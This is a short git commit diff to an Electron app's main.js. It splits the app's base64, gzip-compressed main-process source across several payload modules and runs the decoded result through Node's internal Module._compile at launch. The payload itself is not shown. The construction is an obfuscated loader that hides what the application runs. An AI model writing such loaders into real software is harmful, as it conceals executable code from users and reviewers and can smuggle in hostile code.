2bf3d1961460bc6e9dad0af6820594e7fea6df1e
THE TECH GUY <65334711+jaydumisuni@users.noreply.github.com>
2026-07-31 20:50:23 +0100

    Load verified split native runtime payload

--- electron/main.js
+++ electron/main.js
@@ -1,4 +1,4 @@
 "use strict";
 const zlib=require("zlib"),Module=require("module"),path=require("path");
-const source=zlib.gunzipSync(Buffer.from(require("./main-payload-01")+require("./main-payload-02"),"base64")).toString("utf8");
+const source=zlib.gunzipSync(Buffer.from(require("./main-payload-01")+require("./main-payload-02a")+require("./main-payload-02b")+require("./main-payload-02c")+require("./main-payload-02d"),"base64")).toString("utf8");
 const runtime=new Module(__filename,module);runtime.filename=__filename;runtime.paths=Module._nodeModulePaths(path.dirname(__filename));runtime._compile(source,__filename);
